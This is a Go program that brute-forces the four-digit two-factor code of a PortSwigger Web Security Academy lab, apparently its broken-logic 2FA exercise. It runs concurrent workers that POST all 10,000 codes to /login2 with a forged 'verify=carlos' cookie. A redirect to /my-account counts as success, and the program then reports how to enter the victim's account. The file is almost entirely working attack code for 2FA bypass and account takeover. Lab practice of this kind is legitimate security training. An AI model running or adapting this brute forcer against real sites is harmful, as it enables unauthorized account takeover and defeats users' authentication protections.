package main

import (
	"fmt"
	"io"
	"net/http"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

const baseURL = "https://0a1800ed0415248f81b61ddf00d000ab.web-security-academy.net"

// Paste the exact cookie values from your captured request
const verifyCookie = "carlos"
const sessionCookie = "TfvwWaL5glcj8TOCg5rFgYBK6UXmpPDx"

func main() {
	var found atomic.Bool
	var foundCode string
	var mu sync.Mutex

	codes := make(chan string, 10000)
	for i := 0; i < 10000; i++ {
		codes <- fmt.Sprintf("%04d", i)
	}
	close(codes)

	client := &http.Client{
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse // don't follow redirects automatically
		},
		Timeout: 15 * time.Second,
	}

	var wg sync.WaitGroup
	workers := 15 // keep modest, lab backends can choke / rate-limit on too many

	var tried atomic.Int64

	for w := 0; w < workers; w++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for code := range codes {
				if found.Load() {
					return
				}

				body := "mfa-code=" + code
				req, _ := http.NewRequest("POST", baseURL+"/login2", strings.NewReader(body))
				req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
				req.Header.Set("Cookie", fmt.Sprintf("verify=%s; session=%s", verifyCookie, sessionCookie))
				req.Header.Set("User-Agent", "Mozilla/5.0")

				resp, err := client.Do(req)
				tried.Add(1)
				if err != nil {
					continue
				}
				loc := resp.Header.Get("Location")
				io.Copy(io.Discard, resp.Body)
				resp.Body.Close()

				// success -> redirect to /my-account
				// failure -> redirect back to /login2 (incorrect code)
				if strings.Contains(loc, "/my-account") {
					mu.Lock()
					if !found.Load() {
						found.Store(true)
						foundCode = code
						fmt.Println("\n[+] FOUND CODE:", code, "-> Location:", loc)
					}
					mu.Unlock()
					return
				}
			}
		}()
	}

	// progress ticker
	done := make(chan struct{})
	go func() {
		ticker := time.NewTicker(2 * time.Second)
		defer ticker.Stop()
		for {
			select {
			case <-ticker.C:
				fmt.Printf("[*] tried %d codes so far...\n", tried.Load())
			case <-done:
				return
			}
		}
	}()

	wg.Wait()
	close(done)

	if foundCode == "" {
		fmt.Println("\n[-] No code found in 0000-9999. Possible reasons:")
		fmt.Println("    - the session/verify cookie expired (re-trigger via Repeater and update consts)")
		fmt.Println("    - too many parallel requests caused the lab to drop/reset the session")
	} else {
		fmt.Println("[+] Now visit /my-account using cookie: session=" + sessionCookie + "; verify=" + verifyCookie + " to confirm access to Carlos's account")
	}
}